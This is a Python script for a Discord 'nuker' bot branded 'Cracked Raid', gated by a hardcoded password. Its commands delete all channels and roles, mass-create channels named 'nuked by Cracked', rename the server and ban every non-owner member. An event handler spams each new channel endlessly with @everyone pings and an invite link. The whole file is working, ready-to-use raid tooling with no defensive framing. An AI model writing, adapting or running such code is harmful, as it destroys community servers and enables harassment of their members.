import discord
from discord.ext import commands
import os
import subprocess
import sys

def instalar_bibliotecas():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\033[31mInstalling the necessary libraries...\033[31m")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "discord.py"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "discord"])
    print("\033[31mLibraries installed successfully.\033[31m")
    input("\033[31mPress enter to continue...\033[31m")

os.system('cls' if os.name == 'nt' else 'clear')

NNN = " "
PSWW = "r8T#sP3d!lX2wZ9v"
PSW = input("""Enter the password available in the github repository
https://github.com/
.""")

os.system('cls' if os.name == 'nt' else 'clear')

BNNR = """\033[31m ▄▄· ▄▄▄   ▄▄▄·  ▄▄· ▄ •▄ ▄▄▄ .·▄▄▄▄      ▄▄▄   ▄▄▄· ▪  ·▄▄▄▄  
▐█ ▌▪▀▄ █·▐█ ▀█ ▐█ ▌▪█▌▄▌▪▀▄.▀·██▪ ██     ▀▄ █·▐█ ▀█ ██ ██▪ ██ 
██ ▄▄▐▀▀▄ ▄█▀▀█ ██ ▄▄▐▀▀▄·▐▀▀▪▄▐█· ▐█▌    ▐▀▀▄ ▄█▀▀█ ▐█·▐█· ▐█▌
▐███▌▐█•█▌▐█ ▪▐▌▐███▌▐█.█▌▐█▄▄▌██. ██     ▐█•█▌▐█ ▪▐▌▐█▌██. ██ 
·▀▀▀ .▀  ▀ ▀  ▀ ·▀▀▀ ·▀  ▀ ▀▀▀ ▀▀▀▀▀•     .▀  ▀ ▀  ▀ ▀▀▀▀▀▀▀▀•\033[31m"""

if PSW == PSWW:
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(BNNR)
        print("\033[31mSelect an option:\033[31m")
        print("\033[31m[1] Run the program\033[31m")
        print("\033[31m[2] Exit\033[31m")

        opcion = input("\033[31mSelect an option (1/2): \033[31m")

        if opcion == "999999999999999999999999999999999999999999999999999999":
            instalar_bibliotecas()
            break 
        elif opcion == "1":
            os.system('cls' if os.name == 'nt' else 'clear')
            print(BNNR)
            token = input("\033[31mEnter your bot token: \033[31m")
            break
        elif opcion == "2":
            sys.exit()
        else:
            print("Invalid option. Please try again.")
            continue 

client = commands.Bot(command_prefix="$", intents=discord.Intents.all())

def help_command():
    print("""\033[32mThese are the available commands\033[32m
\033[31m[1]\033[31m \033[32mkill, delete, del:\033[32m Delete all channels in the guild.
\033[31m[2]\033[31m \033[32mnuke, create_channels:\033[32m Create a large number of channels on the guild.
\033[31m[3]\033[31m \033[32mname:\033[32m Change the new guild name.
\033[31m[4]\033[31m \033[32mban:\033[32m Ban all members in the server.
""")

@client.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BNNR)
    print("\033[32m!!!Token valid¡¡¡\033[32m")
    print(NNN)
    OOO = input("Type 'help' to see the list of commands: ")

    if OOO.lower() == "help":
        help_command()

@client.command(aliases=["del", "kill", "delete"])
async def Destroy_server(ctx):
    await ctx.message.delete()
    deleted_channels = 0 
    try:
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print(f"\033[32mDeleted channel: {channel.name}\033[0m")
                deleted_channels += 1
            except Exception as e:
                print(f"\033[31mCan't delete channel: {channel.name}. Error: {e}\033[0m")
        if deleted_channels == 0:
            print("\033[33mNo channels were deleted. The server may not have deletable channels.\033[0m")
        else:
            print("\033[32mDeletion process finished. All possible channels have been deleted.\033[0m")
    except Exception as e:
        print(f"\033[31mError during deletion process. Error: {e}\033[0m")

@client.command(aliases=["nuke", "create_channels"])
async def Nuke_server(ctx):
    await ctx.message.delete()
    for _ in range(100):
        await ctx.guild.create_text_channel("nuked by Cracked")

@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send("""This server has been nuked by <@1168030188622315552>
https://discord.gg/d7dkxEFzfK

      https://cdn.discordapp.com/attachments/1327797313128894514/1328061498190336060/GUH32Mnj.gif?ex=67855527&is=678403a7&hm=84a3b0d9d412676d34b1d2864e0ff2b51fe5c6bf9e0bbced9324d20f16a75e3b&                     

@everyone / @here""")

@client.command(aliases=["Roles", "roles", "Role", "role"])
async def Destroy_roles(ctx):
    await ctx.message.delete()
    try:
        for role in ctx.guild.roles:
            if role.name != "@everyone":
                await role.delete()
                print(f"\033[32mI deleted: {role}\033[32m")
            else:
                print("\033[31mI could not delete: @everyone\033[31m")
    except Exception as e:
        print(f"\033[31mI could not delete. Error: {e}\033[31m")

@client.command(aliases=["Name", "name"])
async def Change_server_name(ctx, *, new_name: str):
    try:
        await ctx.message.delete()
        await ctx.guild.edit(name=new_name)
        print(f"\033[32mThe new server name is: {new_name}")
    except Exception as e:
        print(f"I could not change the server name: {e}")

@client.command(aliases=["Ban", "ban"])
async def Ban_guild_members(ctx):
    await ctx.message.delete()
    try:
        for member in ctx.guild.members:
            if member != ctx.guild.owner and not member.bot:
                try:
                    await member.ban(reason="Icracked.rip")
                    print(f"{member.name} has been banned.")
                except Exception as e:
                    print(f"I could not ban {member.name}: {e}.")
        print("All members ban complete.")
    except Exception as e:
        print(f"Error: {e}")

client.run(token)
